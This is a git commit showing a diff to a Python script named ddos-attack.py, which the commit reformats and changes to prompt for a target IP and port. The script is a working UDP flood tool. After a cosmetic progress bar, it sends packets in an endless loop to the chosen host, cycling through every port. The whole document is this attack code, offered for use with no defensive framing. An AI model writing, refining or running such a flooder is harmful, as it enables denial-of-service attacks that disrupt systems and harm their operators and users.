7447277488d9c696a8a01c9bb76e88b6a940d508
RlyEasy <nazmiev69@gmail.com>
2020-11-18 21:49:47 +0300

    Refactored to pep8, uncommented inputs

--- ddos-attack.py
+++ ddos-attack.py
@@ -1,7 +1,5 @@
-# import datetime
+#!/usr/bin/env python3
 from datetime import datetime
-import os
-from random import randint
 import socket
 import sys
 import time
@@ -11,37 +9,30 @@ def get_current_date_time() -> str:
     now: datetime = datetime.now()
     return now.strftime("%d/%m/%Y %H:%M:%S")
 
-# ip = input("IP Target : ")
-# port = input("Port: ")
 
-ip = '192.168.42.130'
+ip = input("IP Target : ")
 try:
-     port = int('80')
+    port = int(input("Port: "))
 except ValueError:
-     print('Invalid value')
-     sys.exit(1)
+    print('Invalid value')
+    sys.exit(1)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-# sock.bind((ip, port))
-# sock.listen(1)
+for i in range(5):
+    print('[', end='')
+    for j in range(i * 4):
+        print('=', end='')
+    for k in range(16 - i * 4):
+        print(' ', end='')
+    print(f'] {i * 25}%')
+    time.sleep(0.5)
 
-# for i in range(5):
-#      print('[', end='')
-#      for j in range(i*4):
-#           print('=', end='')
-#      for k in range(16-i*4):
-#           print(' ', end='')
-#      print(f'] {i * 25}%')
-#      time.sleep(1)
-
-sent: int = 0
+packets_count: int = 0
 print('Started at ', get_current_date_time())
 while True:
-     # bytes_to_send: str = str(randint(1, 1490))
-     sock.sendto(b'1', (ip, port))
-     sent += 1
-     port += 1
-     print(f"Sent {sent} packet to {ip} throught port:{port}")
-     if port == 65534:
-       port = 1
-print('Finished at ', get_current_date_time())
+    sock.sendto(b'1', (ip, port))
+    packets_count += 1
+    port += 1
+    print(f"Sent {packets_count} packet to {ip} through port:{port}")
+    if port == 65534:
+        port = 1
